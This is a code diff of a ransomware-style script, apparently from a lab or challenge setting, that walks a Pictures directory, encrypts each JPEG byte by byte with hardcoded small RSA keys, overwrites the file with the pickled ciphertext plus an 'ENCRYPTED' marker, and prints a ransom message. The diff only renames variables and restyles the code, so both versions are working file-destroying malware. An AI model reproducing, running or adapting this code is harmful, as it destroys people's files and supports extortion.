@@ -7,35 +7,36 @@ from os import listdir
 n = 22291846172619859445381409012451
 e = 65535
 d = 14499309299673345844676003563183
-marker = b'ENCRYPTED'
+check = b'ENCRYPTED'
 
-# Check if a file has been encrypted
 def is_encrypted(filename):
-    with open(filename, 'rb') as file:
-        file.seek(-len(marker), 2)  # Go to the position before the marker
-        return file.read() == marker
+    f = open(filename, 'rb')
+    f.seek(-len(check), 2)  # Go to the position before the check
+    if f.read() == check:
+        f.close()
+        return True
+    else:
+        f.close()
+        return False
 
-file_dir = '/app/Pictures/'
+pic_dir = '/app/Pictures/'
 
-for file in listdir(file_dir):
+for file in listdir(pic_dir):
     if not file.endswith('.jpg'):
         continue
-    filename = f'{file_dir}{file}'
+    filename = pic_dir + file
     if not is_encrypted(filename):
-        # print(f'Encrypting {filename}')
-        # encrypt
         plain_bytes = b''
         with open(filename, 'rb') as f:
             plain_bytes = f.read()
-        cipher = [pow(i, e, n) for i in plain_bytes]
+        cipher_int = [pow(i, e, n) for i in plain_bytes]
         with open(filename, 'wb') as f:
-            pickle.dump(cipher, f)
-            f.write(marker)  # Add the marker at the end of the file
+            pickle.dump(cipher_int, f)
+            f.write(check)  # Add the check at the end of the file
 END
 
-echo "////////////////////////////////////////////////////////////////////////"
-echo "///////////////////////---------ERROR--------///////////////////////////"
-echo "////////////////---------Give me ransom hahaha---------/////////////////"
-echo "////////////////////////////////////////////////////////////////////////"
-
+echo "//////////////////////////////////////////////////////////////////"
+echo "//////////////////---------ERROR!!!!--------//////////////////////"
+echo "/////////////---------Give me ransom haha!-------/////////////////"
+echo "//////////////////////////////////////////////////////////////////"
 exit 0
